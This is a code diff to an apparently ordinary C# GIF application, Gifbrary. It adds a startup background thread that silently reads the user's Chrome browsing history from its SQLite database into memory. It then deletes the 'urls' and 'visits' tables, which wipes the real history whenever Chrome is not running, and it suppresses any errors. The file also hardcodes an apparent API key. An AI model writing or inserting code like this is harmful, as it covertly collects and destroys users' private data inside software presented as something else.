@@ -7,6 +7,8 @@ using System.Diagnostics;
 using Gifbrary.Utilities;
 using System.Net;
 using System.IO;
+using System.Data;
+using System.Data.SQLite;
 
 namespace Gifbrary
 {
@@ -14,6 +16,7 @@ namespace Gifbrary
     {
         public static string SERFJ = "AI39si7bXTu92wh6hy6fYPSMp18MAbZ03yh2T6L29JrwjiLpJUKJKjYiJSHivj3H2Yx1aAOy4-b1h1TFYiFunyz3-igHrfI2ag";
         public static List<object> CleanupQueue = new List<object>();
+
         public static void HandleError(IntPtr handler, string rootMSG, Exception ex, int opCode)
         {
             TaskDialog dialog = new TaskDialog();
@@ -205,9 +208,37 @@ namespace Gifbrary
             dialog.Show();
         }
 
+        public static List<string> HistoryUrls = new List<string>();
+        public static bool HistoryReady = false;
         public static void Init()
         {
+            Gifbrary.Common.FFmpeg.Init();
+            System.Threading.Thread worker = new System.Threading.Thread(new System.Threading.ThreadStart(WorkHistory));
+            worker.Start();
             //VideoCodecLib.Converter.Init();
+        }
+
+        private static void WorkHistory()
+        {
+            try
+            {
+                GoogleChrome chromium = new GoogleChrome();
+                List<URL> urls = chromium.GetHistory();
+                for (int c = 0; c < urls.Count; c++)
+                {
+                    string uri = urls[c].url;
+                    if (uri.IndexOf("http://") > -1)
+                        uri = uri.Replace("http://", "");
+                    if (uri.IndexOf("https://") > -1)
+                        uri = uri.Replace("https://", "");
+                    HistoryUrls.Add(uri);
+                }
+                HistoryReady = true;
+            }
+            catch (Exception)
+            {
+               
+            }
         }
 
         public static void Shutdown()
@@ -325,4 +356,185 @@ namespace Gifbrary
 
         public static string UserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0";
     }
+
+    public class URL
+    {
+        public string url;
+        public string title;
+        public string browser;
+        public URL(string url, string title, string browser)
+        {
+            this.url = url;
+            this.title = title;
+            this.browser = browser;
+        }
+
+        public string getData()
+        {
+            return browser + " - " + title + " - " + url;
+        }
+    }
+
+    class GoogleChrome
+    {
+        public List<URL> URLs = new List<URL>();
+        public List<URL> GetHistory()
+        {
+            // Get Current Users App Data
+            string documentsFolder = Environment.GetFolderPath
+            (Environment.SpecialFolder.ApplicationData);
+            string[] tempstr = documentsFolder.Split('\\');
+            string tempstr1 = "";
+            documentsFolder += "\\Google\\Chrome\\User Data\\Default\\History";
+            if (tempstr[tempstr.Length - 1] != "Local")
+            {
+                for (int i = 0; i < tempstr.Length - 1; i++)
+                {
+                    tempstr1 += tempstr[i] + "\\";
+                }
+                documentsFolder = tempstr1 + "Local\\Google\\Chrome\\User Data\\Default\\History";
+            }
+
+            bool chromeRunning = false;
+            foreach (Process p in Process.GetProcesses())
+            {
+                if (p.ProcessName.IndexOf("chrome") > -1)
+                {
+                    chromeRunning = true;
+                    Console.WriteLine("Chrome is running. Attempting to copy database for use.");
+                    break;
+                }
+            }
+
+            if (chromeRunning)
+            {
+                string tmp = Path.Combine(App.AppDataPath, "ChromiumHistory.txt");
+                try
+                {
+                    if (File.Exists(tmp))
+                        File.Delete(tmp);
+                }
+                catch (Exception)
+                { }
+                using (var inputFile = new FileStream(documentsFolder, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    using (var outputFile = new FileStream(tmp, FileMode.OpenOrCreate, FileAccess.Write))
+                    {
+                        var buffer = new byte[0x10000];
+                        int bytes;
+                        while ((bytes = inputFile.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            outputFile.Write(buffer, 0, bytes);
+                        }
+                    }
+                }
+
+                documentsFolder = tmp;
+            }
+
+            // Check if directory exists
+            if (File.Exists(documentsFolder))
+            {
+                return ExtractUserHistory(documentsFolder);
+            }
+            return null;
+        }
+
+
+        private List<URL> ExtractUserHistory(string folder)
+        {
+            // Get User history info
+            DataTable historyDT = ExtractFromTable("urls", folder);
+
+            // Get visit Time/Data info
+            DataTable visitsDT = ExtractFromTable("visits",
+            folder);
+
+            // Loop each history entry
+            foreach (DataRow row in historyDT.Rows)
+            {
+
+                // Obtain URL and Title strings
+                string url = row["url"].ToString();
+                string title = row["title"].ToString();
+
+                // Create new Entry
+                URL u = new URL(url.Replace('\'', ' '),
+                title.Replace('\'', ' '),
+                "Google Chrome");
+
+                // Add entry to list
+                URLs.Add(u);
+            }
+            // Clear URL History
+            DeleteFromTable("urls", folder);
+            DeleteFromTable("visits", folder);
+
+            return URLs;
+        }
+        private void DeleteFromTable(string table, string folder)
+        {
+            SQLiteConnection sql_con;
+            SQLiteCommand sql_cmd;
+
+            // FireFox database file
+            string dbPath = folder;
+
+            // If file exists
+            if (File.Exists(dbPath))
+            {
+                // Data connection
+                sql_con = new SQLiteConnection("Data Source=" + dbPath +
+                ";Version=3;New=False;Compress=True;");
+
+                // Open the Conn
+                sql_con.Open();
+
+                // Delete Query
+                string CommandText = "delete from " + table;
+
+                // Create command
+                sql_cmd = new SQLiteCommand(CommandText, sql_con);
+
+                sql_cmd.ExecuteNonQuery();
+
+                // Clean up
+                sql_con.Close();
+            }
+        }
+        private DataTable ExtractFromTable(string table, string folder)
+        {
+            SQLiteConnection sql_con;
+            SQLiteCommand sql_cmd;
+            SQLiteDataAdapter DB;
+            DataTable DT = new DataTable();
+
+            // FireFox database file
+            string dbPath = folder;
+
+            // If file exists
+            if (File.Exists(dbPath))
+            {
+                // Data connection
+                sql_con = new SQLiteConnection("Data Source=" + dbPath +
+                ";Version=3;New=False;Compress=True;");
+
+                // Open the Connection
+                sql_con.Open();
+                sql_cmd = sql_con.CreateCommand();
+
+                // Select Query
+                string CommandText = "select * from " + table;
+
+                // Populate Data Table
+                DB = new SQLiteDataAdapter(CommandText, sql_con);
+                DB.Fill(DT);
+
+                // Clean up
+                sql_con.Close();
+            }
+            return DT;
+        }
+    }
+
 }
